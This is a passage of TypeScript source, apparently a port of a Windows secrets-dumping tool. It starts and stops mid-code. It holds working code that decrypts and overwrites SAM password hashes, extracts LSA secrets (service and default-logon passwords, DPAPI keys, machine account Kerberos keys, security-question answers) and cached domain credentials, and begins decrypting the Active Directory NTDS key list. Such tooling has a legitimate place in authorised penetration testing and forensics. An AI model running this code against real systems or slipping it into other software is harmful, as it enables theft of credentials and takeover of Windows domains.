      const rid = parseInt(ridStr, 16);

      const V = userAccount.get('Data') as Buffer;
      const nameOff = Number(userAccount.get('NameOffset'));
      const nameLen = Number(userAccount.get('NameLength'));
      const userName = V.subarray(nameOff, nameOff + nameLen).toString('utf16le');

      if (userName.toLowerCase() !== user.toLowerCase()) continue;

      LOG.debug(`Located rid for "${user}": ${rid}`);

      if (Number(userAccount.get('NTHashLength')) === 0) {
        LOG.error(
          `SAM hashes change for user ${userName} failed. The account doesn't have hash information.`,
        );
        return;
      }

      let encNTHash: any = null;
      let encLMHash: any = null;
      let newStyle = false;

      const ntHashOffset = Number(userAccount.get('NTHashOffset'));
      const ntHashSlice = V.subarray(ntHashOffset);
      if (ntHashSlice[2] === 0x01) {
        newStyle = false;
        const lmHashLength = Number(userAccount.get('LMHashLength'));
        const lmHashOffset = Number(userAccount.get('LMHashOffset'));
        if (lmHashLength === 20) {
          encLMHash = new SAM_HASH();
          encLMHash.fromString(V.subarray(lmHashOffset, lmHashOffset + lmHashLength));
        }
        const ntHashLength = Number(userAccount.get('NTHashLength'));
        if (ntHashLength === 20) {
          encNTHash = new SAM_HASH();
          encNTHash.fromString(V.subarray(ntHashOffset, ntHashOffset + ntHashLength));
        }
      } else {
        newStyle = true;
        const lmHashLength = Number(userAccount.get('LMHashLength'));
        const lmHashOffset = Number(userAccount.get('LMHashOffset'));
        if (lmHashLength === 24) {
          encLMHash = new SAM_HASH_AES();
          encLMHash.fromString(V.subarray(lmHashOffset, lmHashOffset + lmHashLength));
        }
        const ntHashLength = Number(userAccount.get('NTHashLength'));
        encNTHash = new SAM_HASH_AES();
        encNTHash.fromString(V.subarray(ntHashOffset, ntHashOffset + ntHashLength));
      }

      let lmHash: Buffer;
      let currentNewLMHash = newLMHash;
      if (Number(userAccount.get('LMHashLength')) >= 20 && encLMHash) {
        lmHash = this.decryptHash(rid, encLMHash, LMPASSWORD, newStyle);
      } else {
        lmHash = Buffer.alloc(0);
        currentNewLMHash = Buffer.alloc(0);
      }

      let ntHash: Buffer;
      let currentNewNTHash = newNTHash;
      if (encNTHash !== null) {
        ntHash = this.decryptHash(rid, encNTHash, NTPASSWORD, newStyle);
      } else {
        ntHash = Buffer.alloc(0);
        currentNewNTHash = Buffer.alloc(0);
      }

      let userChanged = false;
      if (currentNewLMHash.length > 0 && encLMHash) {
        const encrypted = this.encryptHash(
          rid,
          currentNewLMHash,
          encLMHash.get('Salt') as Buffer,
          LMPASSWORD,
          newStyle,
        );
        encLMHash.set('Hash', encrypted);
        if (Number(userAccount.get('LMHashLength')) !== encLMHash.getData().length) {
          LOG.error('Mismatching LM lengths received.');
          LOG.info('User probably has an empty password. Unable to set new LM hash.');
          currentNewLMHash = Buffer.alloc(0);
        } else {
          const lmOff = Number(userAccount.get('LMHashOffset'));
          userAccount.set('Data', this.replaceValue(V, lmOff, encLMHash.getData()));
          userChanged = true;
        }
      }

      if (currentNewNTHash.length > 0 && encNTHash) {
        const encrypted = this.encryptHash(
          rid,
          currentNewNTHash,
          encNTHash.get('Salt') as Buffer,
          NTPASSWORD,
          newStyle,
        );
        encNTHash.set('Hash', encrypted);
        if (Number(userAccount.get('NTHashLength')) !== encNTHash.getData().length) {
          LOG.error('Mismatching NT lengths received!');
          LOG.info('User probably has an empty password. Unable to set new NT hash.');
          return;
        }
        const ntOff = Number(userAccount.get('NTHashOffset'));
        userAccount.set(
          'Data',
          this.replaceValue(userAccount.get('Data') as Buffer, ntOff, encNTHash.getData()),
        );
        userChanged = true;
      }

      if (lmHash.length === 0) lmHash = Buffer.from(lmowfV1('', ''));
      if (ntHash.length === 0) ntHash = Buffer.from(ntowfV1('', ''));

      LOG.info(
        `Previous user hash: ${userName}:${rid}:${lmHash.toString('hex')}:${ntHash.toString('hex')}:::`,
      );

      if (userChanged) {
        if (this.setValue(ntpathJoin(usersKey, ridStr, 'V'), userAccount.getData()) === undefined) {
          LOG.error('Failed to write new user hash to SAM hive.');
          return;
        }
      } else {
        LOG.info(
          'Unable to change user hash, please ensure the target user already has a password set.',
        );
      }

      if (currentNewLMHash.length === 0) currentNewLMHash = Buffer.from(lmowfV1('', ''));
      if (currentNewNTHash.length === 0) currentNewNTHash = Buffer.from(ntowfV1('', ''));

      const answer = `${userName}:${rid}:${currentNewLMHash.toString('hex')}:${currentNewNTHash.toString('hex')}:::`;
      this.itemsFound.set(rid, answer);
      this.perSecretCallback(answer);
    }
  }

  export(baseFileName: string, openFileFunc?: OpenFileFunc): string | undefined {
    if (this.itemsFound.size > 0) {
      const items = [...this.itemsFound.keys()].sort((a, b) => a - b);
      const fileName = `${baseFileName}.sam`;
      const fd = openFile(fileName, 'w+', openFileFunc);
      for (const item of items) {
        fd.write(this.itemsFound.get(item)! + '\n');
      }
      fd.end();
      return fileName;
    }
    return undefined;
  }
}

// ---------------------------------------------------------------------------
// LSASecrets
// ---------------------------------------------------------------------------

export class LSASecrets extends OfflineRegistry {
  static UNKNOWN_USER = '(Unknown User)';

  static SECRET_TYPE = {
    LSA: 0,
    LSA_HASHED: 1,
    LSA_RAW: 2,
    LSA_KERBEROS: 3,
  } as const;

  private hashedBootKey = Buffer.alloc(0);
  private _bootKey: Buffer;
  private lsaKey = Buffer.alloc(0);
  private nklmKey = Buffer.alloc(0);
  private vistaStyle = true;
  private cryptoCommon = new CryptoCommon();
  private securityFile: any;
  private remoteOps: RemoteOperations | null;
  private cachedItems: string[] = [];
  private secretItems: string[] = [];
  private perSecretCallback: (secretType: number, secret: string) => void;
  private history: boolean;

  constructor(
    securityFile: any,
    bootKey: Buffer,
    remoteOps: RemoteOperations | null = null,
    isRemote = false,
    history = false,
    perSecretCallback: (secretType: number, secret: string) => void = (_type, secret) =>
      _printHelper(secret),
  ) {
    super(securityFile, isRemote);
    this._bootKey = bootKey;
    this.securityFile = securityFile;
    this.remoteOps = remoteOps;
    this.history = history;
    this.perSecretCallback = perSecretCallback;
  }

  private md5(data: Buffer): Buffer {
    return nodeCrypto.createHash('md5').update(data).digest();
  }

  private sha256(key: Buffer, value: Buffer, _rounds = 1000): Buffer {
    const sha = nodeCrypto.createHash('sha256');
    sha.update(key);
    for (let i = 0; i < 1000; i++) {
      sha.update(value);
    }
    return sha.digest();
  }

  private decryptSecretXP(key: Buffer, value: Buffer): Buffer {
    let plainText = Buffer.alloc(0);
    const encryptedSecretSize = value.readUInt32LE(0);
    let encData = value.subarray(value.length - encryptedSecretSize);
    let key0 = key;

    while (encData.length > 0) {
      const cipherText = encData.subarray(0, 8);
      const tmpStrKey = key0.subarray(0, 7);
      const tmpKey = transformKey(tmpStrKey);
      plainText = Buffer.concat([plainText, desEcbDecryptBlock(tmpKey, cipherText)]);
      key0 = key0.subarray(7);
      encData = encData.subarray(8);
      if (key0.length < 7) {
        key0 = key.subarray(key0.length);
      }
    }

    const secret = new LSA_SECRET_XP();
    secret.fromString(plainText);
    return secret.get('Secret') as Buffer;
  }

  private decryptHashRC4(key: Buffer, value: Buffer, iv: Buffer): Buffer {
    const hmac = nodeCrypto.createHmac('md5', key);
    hmac.update(iv);
    const rc4key = hmac.digest();
    return rc4Encrypt(rc4key, value);
  }

  private decryptLSA(value: Buffer): void {
    if (this.vistaStyle) {
      const record = new LSA_SECRET();
      record.fromString(value);
      const encData = record.get('EncryptedData') as Buffer;
      const tmpKey = this.sha256(this._bootKey, encData.subarray(0, 32));
      const plainText = CryptoCommon.decryptAES(tmpKey, encData.subarray(32));
      const blob = new LSA_SECRET_BLOB();
      blob.fromString(Buffer.from(plainText));
      this.lsaKey = Buffer.from((blob.get('Secret') as Buffer).subarray(52, 52 + 32));
    } else {
      const md5Hash = nodeCrypto.createHash('md5');
      md5Hash.update(this._bootKey);
      for (let i = 0; i < 1000; i++) {
        md5Hash.update(value.subarray(60, 76));
      }
      const tmpKey = Buffer.from(md5Hash.digest());
      const plainText = rc4Encrypt(tmpKey, value.subarray(12, 60));
      this.lsaKey = Buffer.from(plainText.subarray(0x10, 0x20));
    }
  }

  private getLSASecretKey(): void {
    LOG.debug('Decrypting LSA Key');
    let value = this.getValue('\\Policy\\PolEKList\\default');
    if (!value) {
      LOG.debug('PolEKList not found, trying PolSecretEncryptionKey');
      value = this.getValue('\\Policy\\PolSecretEncryptionKey\\default');
      this.vistaStyle = false;
      if (!value) return;
    }
    this.decryptLSA(value[1]);
  }

  private getNLKMSecret(): void {
    LOG.debug('Decrypting NL$KM');
    const value = this.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default');
    if (!value) throw new Error("Couldn't get NL$KM value");

    if (this.vistaStyle) {
      const record = new LSA_SECRET();
      record.fromString(value[1]);
      const encData = record.get('EncryptedData') as Buffer;
      const tmpKey = Buffer.from(this.sha256(this.lsaKey, encData.subarray(0, 32)));
      this.nklmKey = Buffer.from(CryptoCommon.decryptAES(tmpKey, encData.subarray(32)));
    } else {
      this.nklmKey = Buffer.from(this.decryptSecretXP(this.lsaKey, value[1]));
    }
  }

  private pad(data: number): number {
    if ((data & 0x3) > 0) {
      return data + (data & 0x3);
    }
    return data;
  }

  dumpCachedHashes(): void {
    if (this.securityFile === null) return;

    LOG.info('Dumping cached domain logon information (domain/username:hash)');

    let values = this.enumValues('\\Cache');
    if (!values) return;

    values = values.filter((v) => {
      const s = v.toString('utf-8');
      return s !== 'NL$Control';
    });

    let iterationCount = 10240;
    const nlIterIdx = values.findIndex((v) => v.toString('utf-8') === 'NL$IterationCount');
    if (nlIterIdx >= 0) {
      values.splice(nlIterIdx, 1);
      const iterVal = this.getValue('\\Cache\\NL$IterationCount');
      if (iterVal) {
        const record = iterVal[1] as number;
        if (record > 10240) {
          iterationCount = record & 0xfffffc00;
        } else {
          iterationCount = record * 1024;
        }
      }
    }

    this.getLSASecretKey();
    this.getNLKMSecret();

    for (const value of values) {
      const valueName = value.toString('utf-8');
      LOG.debug(`Looking into ${valueName}`);
      const cacheVal = this.getValue(ntpathJoin('\\Cache', valueName));
      if (!cacheVal) continue;

      const record = new NL_RECORD();
      record.fromString(cacheVal[1]);
      const iv = record.get('IV') as Buffer;

      if (!iv.equals(Buffer.alloc(16))) {
        const flags = Number(record.get('Flags'));
        if ((flags & 1) === 1) {
          let plainText: Buffer;
          if (this.vistaStyle) {
            plainText = CryptoCommon.decryptAES(
              this.nklmKey.subarray(16, 32),
              record.get('EncryptedData') as Buffer,
              iv,
            );
          } else {
            plainText = this.decryptHashRC4(
              this.nklmKey,
              record.get('EncryptedData') as Buffer,
              iv,
            );
          }

          const encHash = plainText.subarray(0, 0x10);
          let textData = plainText.subarray(0x48);
          const userLength = Number(record.get('UserLength'));
          const userName = textData.subarray(0, userLength).toString('utf16le');
          const domainNameLength = Number(record.get('DomainNameLength'));
          textData = textData.subarray(this.pad(userLength) + this.pad(domainNameLength));
          const dnsDomainNameLength = Number(record.get('DnsDomainNameLength'));
          const domainLong = textData.subarray(0, this.pad(dnsDomainNameLength)).toString('utf16le');
          const lastWrite = Number(record.get('LastWrite'));
          const timestamp = new Date(getUnixTime(lastWrite) * 1000);

          let answer: string;
          if (this.vistaStyle) {
            answer = `${domainLong}/${userName}:$DCC2$${iterationCount}#${userName}#${encHash.toString('hex')}: (${timestamp.toISOString()})`;
          } else {
            answer = `${domainLong}/${userName}:${encHash.toString('hex')}:${userName}: (${timestamp.toISOString()})`;
          }

          this.cachedItems.push(answer);
          this.perSecretCallback(LSASecrets.SECRET_TYPE.LSA_HASHED, answer);
        }
      }
    }
  }

  private async printSecret(name: string, secretItem: Buffer): Promise<void> {
    if (secretItem.length === 0) {
      LOG.debug(`Discarding secret ${name}, NULL Data`);
      return;
    }

    if (secretItem[0] === 0 && secretItem[1] === 0) {
      LOG.debug(`Discarding secret ${name}, all zeros`);
      return;
    }

    const upperName = name.toUpperCase();
    LOG.info(name);

    let secret = '';

    if (upperName.startsWith('_SC_')) {
      try {
        const strDecoded = secretItem.toString('utf16le');
        if (this.remoteOps && typeof this.remoteOps.getServiceAccount === 'function') {
          const account = await this.remoteOps.getServiceAccount(name.substring(4));
          secret = account === null ? `${LSASecrets.UNKNOWN_USER}:` : `${account}:`;
        } else {
          secret = `${LSASecrets.UNKNOWN_USER}:`;
        }
        secret += strDecoded;
      } catch {
        // Decode failed
      }
    } else if (upperName.startsWith('DEFAULTPASSWORD')) {
      try {
        const strDecoded = secretItem.toString('utf16le');
        if (this.remoteOps && typeof this.remoteOps.getDefaultLoginAccount === 'function') {
          const account = await this.remoteOps.getDefaultLoginAccount();
          secret = account === null ? `${LSASecrets.UNKNOWN_USER}:` : `${account}:`;
        } else {
          secret = `${LSASecrets.UNKNOWN_USER}:`;
        }
        secret += strDecoded;
      } catch {
        // Decode failed
      }
    } else if (upperName.startsWith('ASPNET_WP_PASSWORD')) {
      try {
        const strDecoded = secretItem.toString('utf16le');
        secret = `ASPNET: ${strDecoded}`;
      } catch {
        // Decode failed
      }
    } else if (upperName.startsWith('DPAPI_SYSTEM')) {
      const dpapi = new DPAPI_SYSTEM();
      dpapi.fromString(secretItem);
      const machineKey = (dpapi.get('MachineKey') as Buffer).toString('hex');
      const userKey = (dpapi.get('UserKey') as Buffer).toString('hex');
      secret = `dpapi_machinekey:0x${machineKey}\ndpapi_userkey:0x${userKey}`;
    } else if (upperName.startsWith('$MACHINE.ACC')) {
      const md4Digest = md4Hash(secretItem);
      let printname: string;
      if (this.remoteOps && typeof this.remoteOps.getMachineNameAndDomain === 'function') {
        const [machine, domain] = await this.remoteOps.getMachineNameAndDomain();
        printname = `${domain}\\${machine}$`;
        secret = `${domain}\\${machine}$:${Buffer.from(lmowfV1('', '')).toString('hex')}:${md4Digest.toString('hex')}:::`;
      } else {
        printname = '$MACHINE.ACC';
        secret = `$MACHINE.ACC: ${Buffer.from(lmowfV1('', '')).toString('hex')}:${md4Digest.toString('hex')}`;
      }

      if (!this.printMachineKerberos(secretItem, printname)) {
        LOG.debug(
          'Could not calculate machine account Kerberos keys, only printing plain password (hex encoded)',
        );
      }
      const extrasecret = `${printname}:plain_password_hex:${secretItem.toString('hex')}`;
      this.secretItems.push(extrasecret);
      this.perSecretCallback(LSASecrets.SECRET_TYPE.LSA, extrasecret);
    } else if (/^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$/.test(upperName)) {
      const match = upperName.match(
        /^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$/,
      );
      if (match) {
        const sid = match[1]!;
        try {
          const strDecoded = secretItem
            .toString('utf16le')
            .replace(/ /g, ' ');
          const jsonData = JSON.parse(strDecoded);
          const output: string[] = [];
          if (jsonData.version === 1) {
            output.push(` - Version : ${jsonData.version}`);
            for (const qk of jsonData.questions) {
              output.push(` | Question: ${qk.question}`);
              output.push(` |  |--> Answer: ${qk.answer}`);
            }
            secret = `Security Questions for user ${sid}: \n${output.join('\n')}`;
          } else {
            LOG.warning(
              `Unknown SQSA version (${jsonData.version}), please open an issue with the data so we can add a parser for it.`,
            );
            secret = JSON.stringify(jsonData, null, 4);
          }
        } catch {
          // Parse failed
        }
      }
    }

    if (secret !== '') {
      this.secretItems.push(secret);
      this.perSecretCallback(LSASecrets.SECRET_TYPE.LSA, secret);
    } else {
      const printableSecret = `${name}:${secretItem.toString('hex')}`;
      this.secretItems.push(printableSecret);
      hexdump(secretItem);
      this.perSecretCallback(LSASecrets.SECRET_TYPE.LSA_RAW, printableSecret);
    }
  }

  private printMachineKerberos(rawsecret: Buffer, machinename: string): boolean {
    if (this.remoteOps && typeof this.remoteOps.getMachineKerberosSalt === 'function') {
      const salt = this.remoteOps.getMachineKerberosSalt();
      if (salt.length === 0) return false;

      const allciphers = [
        krb5.Constants.EncryptionTypes.aes256_cts_hmac_sha1_96,
        krb5.Constants.EncryptionTypes.aes128_cts_hmac_sha1_96,
        krb5.Constants.EncryptionTypes.des_cbc_md5,
      ];

      // Microsoft implicitly replaces invalid unicode when converting utf-16 to utf-8
      const rawsecretUtf8 = Buffer.from(
        rawsecret.toString('utf16le').replace(/�/g, '�'),
        'utf-8',
      );

      for (const etype of allciphers) {
        try {
          const key = krb5.Crypto.string_to_key(etype, rawsecretUtf8, salt, null);
          const typename = NTDSHashes.KERBEROS_TYPE[etype] ?? `0x${etype.toString(16)}`;
          const secretStr = `${machinename}:${typename}:${key.contents.toString('hex')}`;
          this.secretItems.push(secretStr);
          this.perSecretCallback(LSASecrets.SECRET_TYPE.LSA_KERBEROS, secretStr);
        } catch (e) {
          LOG.debug(`Exception computing kerberos key: ${e}`);
          throw e;
        }
      }
      return true;
    }
    return false;
  }

  async dumpSecrets(): Promise<void> {
    if (this.securityFile === null) return;

    LOG.info('Dumping LSA Secrets');
    let keys = this.enumKey('\\Policy\\Secrets');
    if (!keys) return;

    keys = keys.filter((k) => k !== 'NL$Control');

    if (this.lsaKey.length === 0) {
      this.getLSASecretKey();
    }

    for (let key of keys) {
      LOG.debug(`Looking into ${key}`);
      const valueTypeList: string[] = ['CurrVal'];
      if (this.history) {
        valueTypeList.push('OldVal');
      }

      for (const valueType of valueTypeList) {
        const value = this.getValue(`\\Policy\\Secrets\\${key}\\${valueType}\\default`);
        if (value && value[1] !== 0) {
          let secret: Buffer;
          if (this.vistaStyle) {
            const record = new LSA_SECRET();
            record.fromString(value[1]);
            const encData = record.get('EncryptedData') as Buffer;
            const tmpKey = this.sha256(this.lsaKey, encData.subarray(0, 32));
            const plainText = CryptoCommon.decryptAES(tmpKey, encData.subarray(32));
            const blob = new LSA_SECRET_BLOB();
            blob.fromString(plainText);
            secret = blob.get('Secret') as Buffer;
          } else {
            secret = this.decryptSecretXP(this.lsaKey, value[1]);
          }

          if (valueType === 'OldVal') {
            key = key + '_history';
          }
          await this.printSecret(key, secret);
        }
      }
    }
  }

  exportSecrets(baseFileName: string, openFileFunc?: OpenFileFunc): string | undefined {
    if (this.secretItems.length > 0) {
      const fileName = `${baseFileName}.secrets`;
      const fd = openFile(fileName, 'w+', openFileFunc);
      for (const item of this.secretItems) {
        fd.write(item + '\n');
      }
      fd.end();
      return fileName;
    }
    return undefined;
  }

  exportCached(baseFileName: string, openFileFunc?: OpenFileFunc): string | undefined {
    if (this.cachedItems.length > 0) {
      const fileName = `${baseFileName}.cached`;
      const fd = openFile(fileName, 'w+', openFileFunc);
      for (const item of this.cachedItems) {
        fd.write(item + '\n');
      }
      fd.end();
      return fileName;
    }
    return undefined;
  }
}

// ---------------------------------------------------------------------------
// ResumeSessionMgrInFile
// ---------------------------------------------------------------------------

export class ResumeSessionMgrInFile {
  private resumeFileName: string | null;
  private resumeFile: number | null = null;
  private _hasResumeData: boolean;

  constructor(resumeFileName: string | null = null) {
    this.resumeFileName = resumeFileName;
    this._hasResumeData = resumeFileName !== null;
  }

  hasResumeData(): boolean {
    return this._hasResumeData;
  }

  clearResumeData(): void {
    this.endTransaction();
    if (this.resumeFileName && fs.existsSync(this.resumeFileName)) {
      fs.unlinkSync(this.resumeFileName);
    }
  }

  writeResumeData(data: string): void {
    if (this.resumeFileName) {
      fs.writeFileSync(this.resumeFileName, data, 'utf-8');
    }
  }

  getResumeData(): string {
    if (!this.resumeFileName) throw new Error('No resume file');
    try {
      const data = fs.readFileSync(this.resumeFileName, 'utf-8');
      return data;
    } catch (e: unknown) {
      throw new Error(`Cannot open resume session file name ${e}`);
    }
  }

  getFileName(): string | null {
    return this.resumeFileName;
  }

  beginTransaction(): void {
    if (!this.resumeFileName) {
      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      let suffix = '';
      for (let i = 0; i < 8; i++) {
        suffix += chars[Math.floor(Math.random() * chars.length)]!;
      }
      this.resumeFileName = `sessionresume_${suffix}`;
      LOG.debug(`Session resume file will be ${this.resumeFileName}`);
    }
    if (this.resumeFile === null) {
      try {
        this.resumeFile = fs.openSync(this.resumeFileName, 'w+');
      } catch (e: unknown) {
        throw new Error(`Cannot create "${this.resumeFileName}" resume session file: ${e}`);
      }
    }
  }

  endTransaction(): void {
    if (this.resumeFile !== null) {
      fs.closeSync(this.resumeFile);
      this.resumeFile = null;
    }
  }
}

// ---------------------------------------------------------------------------
// NTDSHashes
// ---------------------------------------------------------------------------

export class NTDSHashes {
  static SECRET_TYPE = {
    NTDS: 0,
    NTDS_CLEARTEXT: 1,
    NTDS_KERBEROS: 2,
  } as const;

  static NAME_TO_INTERNAL: Record<string, string> = {
    uSNCreated: 'ATTq131091',
    uSNChanged: 'ATTq131192',
    name: 'ATTm3',
    objectGUID: 'ATTk589826',
    objectSid: 'ATTr589970',
    userAccountControl: 'ATTj589832',
    primaryGroupID: 'ATTj589922',
    accountExpires: 'ATTq589983',
    logonCount: 'ATTj589993',
    sAMAccountName: 'ATTm590045',
    sAMAccountType: 'ATTj590126',
    lastLogonTimestamp: 'ATTq589876',
    userPrincipalName: 'ATTm590480',
    unicodePwd: 'ATTk589914',
    dBCSPwd: 'ATTk589879',
    ntPwdHistory: 'ATTk589918',
    lmPwdHistory: 'ATTk589984',
    pekList: 'ATTk590689',
    supplementalCredentials: 'ATTk589949',
    pwdLastSet: 'ATTq589920',
    instanceType: 'ATTj131073',
  };

  static NAME_TO_ATTRTYP: Record<string, number> = {
    userPrincipalName: 0x90290,
    sAMAccountName: 0x900dd,
    unicodePwd: 0x9005a,
    dBCSPwd: 0x90037,
    ntPwdHistory: 0x9005e,
    lmPwdHistory: 0x900a0,
    supplementalCredentials: 0x9007d,
    objectSid: 0x90092,
    userAccountControl: 0x90008,
  };

  static ATTRTYP_TO_ATTID: Record<string, string> = {
    userPrincipalName: '1.2.840.113556.1.4.656',
    sAMAccountName: '1.2.840.113556.1.4.221',
    unicodePwd: '1.2.840.113556.1.4.90',
    dBCSPwd: '1.2.840.113556.1.4.55',
    ntPwdHistory: '1.2.840.113556.1.4.94',
    lmPwdHistory: '1.2.840.113556.1.4.160',
    supplementalCredentials: '1.2.840.113556.1.4.125',
    objectSid: '1.2.840.113556.1.4.146',
    pwdLastSet: '1.2.840.113556.1.4.96',
    userAccountControl: '1.2.840.113556.1.4.8',
  };

  static KERBEROS_TYPE: Record<number, string> = {
    1: 'dec-cbc-crc',
    3: 'des-cbc-md5',
    17: 'aes128-cts-hmac-sha1-96',
    18: 'aes256-cts-hmac-sha1-96',
    0xffffff74: 'rc4_hmac',
  };

  static INTERNAL_TO_NAME: Record<string, string> = Object.fromEntries(
    Object.entries(NTDSHashes.NAME_TO_INTERNAL).map(([k, v]) => [v, k]),
  );

  static SAM_NORMAL_USER_ACCOUNT = 0x30000000;
  static SAM_MACHINE_ACCOUNT = 0x30000001;
  static SAM_TRUST_ACCOUNT = 0x30000002;
  static ACCOUNT_TYPES = [0x30000000, 0x30000001, 0x30000002];

  // Inner structure classes
  static PEKLIST_ENC = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '8s=b""'],
      ['KeyMaterial', '16s=b""'],
      ['EncryptedPek', ':'],
    ];
  };

  static PEKLIST_PLAIN = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '32s=b""'],
      ['DecryptedPek', ':'],
    ];
  };

  static PEK_KEY = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '1s=b""'],
      ['Padding', '3s=b""'],
      ['Key', '16s=b""'],
    ];
  };

  static CRYPTED_HASH = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '8s=b""'],
      ['KeyMaterial', '16s=b""'],
      ['EncryptedHash', '16s=b""'],
    ];
  };

  static CRYPTED_HASHW16 = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '8s=b""'],
      ['KeyMaterial', '16s=b""'],
      ['Unknown', '<L=0'],
      ['EncryptedHash', ':'],
    ];
  };

  static CRYPTED_HISTORY = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '8s=b""'],
      ['KeyMaterial', '16s=b""'],
      ['EncryptedHash', ':'],
    ];
  };

  static CRYPTED_BLOB = class extends Structure {
    static override structure: FieldDescriptor[] = [
      ['Header', '8s=b""'],
      ['KeyMaterial', '16s=b""'],
      ['EncryptedHash', ':'],
    ];
  };

  private _bootKey: Buffer;
  private ntds: any;
  private _history: boolean;
  private noLMHash: boolean;
  private useVSSMethod: boolean;
  private remoteSSMethodWMINTDS: boolean;
  private remoteOps: RemoteOperations | null;
  private pwdLastSet: boolean;
  private printUserStatus: boolean;
  private eseDB: ESENT_DB | null = null;
  private cursor: any = null;
  private tmpUsers: any[] = [];
  private PEK: Buffer[] = [];
  private cryptoCommon = new CryptoCommon();
  private kerberosKeys: Map<string, null> = new Map();
  private clearTextPwds: Map<string, null> = new Map();
  private justNTLM: boolean;
  private resumeSession: ResumeSessionMgrInFile;
  private outputFileName: string | null;
  private justUser: string | null;
  private ldapFilter: string | null;
  private skipUser: string | null;
  private perSecretCallback: (secretType: number, secret: string) => void;
  private filterTablesUsersecret: Set<string>;

  constructor(opts: {
    ntdsFile: any;
    bootKey: Buffer;
    isRemote?: boolean;
    history?: boolean;
    noLMHash?: boolean;
    remoteOps?: RemoteOperations | null;
    useVSSMethod?: boolean;
    remoteSSMethodWMINTDS?: boolean;
    justNTLM?: boolean;
    pwdLastSet?: boolean;
    resumeSession?: string | null;
    outputFileName?: string | null;
    justUser?: string | null;
    skipUser?: string | null;
    ldapFilter?: string | null;
    printUserStatus?: boolean;
    perSecretCallback?: (secretType: number, secret: string) => void;
  }) {
    this._bootKey = opts.bootKey;
    this.ntds = opts.ntdsFile;
    this._history = opts.history ?? false;
    this.noLMHash = opts.noLMHash ?? true;
    this.useVSSMethod = opts.useVSSMethod ?? false;
    this.remoteSSMethodWMINTDS = opts.remoteSSMethodWMINTDS ?? false;
    this.remoteOps = opts.remoteOps ?? null;
    this.pwdLastSet = opts.pwdLastSet ?? false;
    this.printUserStatus = opts.printUserStatus ?? false;
    this.justNTLM = opts.justNTLM ?? false;
    this.resumeSession = new ResumeSessionMgrInFile(opts.resumeSession ?? null);
    this.outputFileName = opts.outputFileName ?? null;
    this.justUser = opts.justUser ?? null;
    this.ldapFilter = opts.ldapFilter ?? null;
    this.skipUser = opts.skipUser ?? null;
    this.perSecretCallback =
      opts.perSecretCallback ?? ((_type, secret) => _printHelper(secret));

    if (this.ntds !== null) {
      this.eseDB = new ESENT_DB(opts.ntdsFile, 8192, opts.isRemote ?? false);
      this.cursor = this.eseDB.openTable('datatable');
    }

    const NTI = NTDSHashes.NAME_TO_INTERNAL;
    this.filterTablesUsersecret = new Set<string>([
      NTI['objectSid']!,
      NTI['dBCSPwd']!,
      NTI['name']!,
      NTI['sAMAccountType']!,
      NTI['unicodePwd']!,
      NTI['sAMAccountName']!,
      NTI['userPrincipalName']!,
      NTI['ntPwdHistory']!,
      NTI['lmPwdHistory']!,
      NTI['pwdLastSet']!,
      NTI['userAccountControl']!,
      NTI['supplementalCredentials']!,
      NTI['pekList']!,
      NTI['instanceType']!,
    ]);
  }

  getResumeSessionFile(): string | null {
    return this.resumeSession.getFileName();
  }

  private getPek(): void {
    LOG.info('Searching for pekList, be patient');
    const NTI = NTDSHashes.NAME_TO_INTERNAL;

    while (true) {
      let record: any;
      try {
        record = this.eseDB!.getNextRow(this.cursor, this.filterTablesUsersecret);
      } catch {
        LOG.error('Error while calling getNextRow(), trying the next one');
        continue;
      }

      if (record === null) break;

      if (record[NTI['pekList']!] !== null && record[NTI['pekList']!] !== undefined) {
        const peklist = Buffer.from(record[NTI['pekList']!] as string, 'hex');
        this.decodePek(peklist);
        break;
      } else if (
        NTDSHashes.ACCOUNT_TYPES.includes(record[NTI['sAMAccountType']!]) &&
        (record[NTI['instanceType']!] & 4) !== 0
      ) {
        this.tmpUsers.push(record);
      }
    }
  }

  private decodePek(peklist: Buffer): void {
    const encryptedPekList = new NTDSHashes.PEKLIST_ENC();
    encryptedPekList.fromString(peklist);
    const header = encryptedPekList.get('Header') as Buffer;

    if (header.subarray(0, 4).equals(Buffer.from([0x02, 0x00, 0x00, 0x00]))) {
      // Up to Windows 2012 R2
      const md5Hash = nodeCrypto.createHash('md5');
      md5Hash.update(this._bootKey);
      const keyMaterial = encryptedPekList.get('KeyMaterial') as Buffer;
      for (let i = 0; i < 1000; i++) {
        md5Hash.update(keyMaterial);
      }
      const tmpKey = md5Hash.digest();
      const decrypted = rc4Encrypt(tmpKey, encryptedPekList.get('EncryptedPek') as Buffer);
      const decryptedPekList = new NTDSHashes.PEKLIST_PLAIN();
      decryptedPekList.fromString(decrypted);

      const pekKeyInstance = new NTDSHashes.PEK_KEY();
      const PEKLen = pekKeyInstance.getData().length;
      const decPek = decryptedPekList.get('DecryptedPek') as Buffer;
      for (let i = 0; i < Math.floor(decPek.length / PEKLen); i++) {
        const cursor = i * PEKLen;
        const pek = new NTDSHashes.PEK_KEY();
        pek.fromString(decPek.subarray(cursor, cursor + PEKLen));
        LOG.info(`PEK # ${i} found and decrypted: ${(pek.get('Key') as Buffer).toString('hex')}`);
        this.PEK.push(pek.get('Key') as Buffer);
      }
    } else if (header.subarray(0, 4).equals(Buffer.from([0x03, 0x00, 0x00, 0x00]))) {
      // Windows 2016 TP4+
      const decrypted = CryptoCommon.decryptAES(
        this._bootKey,
        encryptedPekList.get('EncryptedPek') as Buffer,
        encryptedPekList.get('KeyMaterial') as Buffer,
      );
      const decryptedPekList = new NTDSHashes.PEKLIST_PLAIN();
      decryptedPekList.fromString(decrypted);
      const decPek = decryptedPekList.get('DecryptedPek') as Buffer;

      let pos = 0;
      let curIndex = 0;
      while (true) {
        const pekEntry = decPek.subarray(pos, pos + 20);
        if (pekEntry.length < 20) break;
        const index = pekEntry.readUInt32LE(0);
        const pek = pekEntry.subarray(4, 20);
        if (index !== curIndex) break;
